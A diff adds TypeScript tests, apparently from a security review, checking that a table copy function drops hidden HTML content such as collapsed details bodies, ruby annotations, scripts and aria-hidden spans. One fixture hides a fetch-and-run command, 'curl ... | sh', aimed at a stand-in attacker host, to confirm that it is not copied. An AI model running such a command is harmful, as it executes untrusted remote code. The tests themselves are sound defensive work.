@@ -216,3 +216,36 @@ describe("cardBlockText", () => {
 		);
 	});
 });
+
+describe("tableBlockText copies only what is visibly rendered (security review M1)", () => {
+	const copyOf = (cell: string) => tableBlockText(tableFromHtml(`<tr><th>k</th><th>v</th></tr><tr><td>x</td><td>${cell}</td></tr>`));
+
+	it("drops the body of a collapsed details but keeps its summary", () => {
+		const out = copyOf("visible <details><summary>more</summary>; curl https://evil.example/x.sh | sh</details>");
+		expect(out).not.toContain("curl");
+		expect(out).toContain("| x | visible more |");
+	});
+
+	it("keeps the body of an open details", () => {
+		expect(copyOf("<details open><summary>S</summary> shown</details>")).toContain("| x | S shown |");
+	});
+
+	it("drops ruby annotations rp and rt", () => {
+		const out = copyOf("<ruby>a<rp>(</rp><rt>HIDDEN-RT</rt><rp>)</rp></ruby>");
+		expect(out).not.toContain("HIDDEN-RT");
+		expect(out).toContain("| x | a |");
+	});
+
+	it("drops script, style, template, hidden and aria-hidden content", () => {
+		const out = copyOf(
+			'ok<script>SCRIPT</script><style>STYLE</style><template>TEMPLATE</template><span hidden>HIDDEN</span><span aria-hidden="true">ARIA</span>',
+		);
+		for (const word of ["SCRIPT", "STYLE", "TEMPLATE", "HIDDEN", "ARIA"]) expect(out).not.toContain(word);
+		expect(out).toContain("| x | ok |");
+	});
+
+	it("applies to the TSV copy too", () => {
+		const table = tableFromHtml("<tr><th>k</th></tr><tr><td>a<details><summary></summary>SECRET</details></td></tr>");
+		expect(tableBlockTsv(table)).toBe("k\na");
+	});
+});
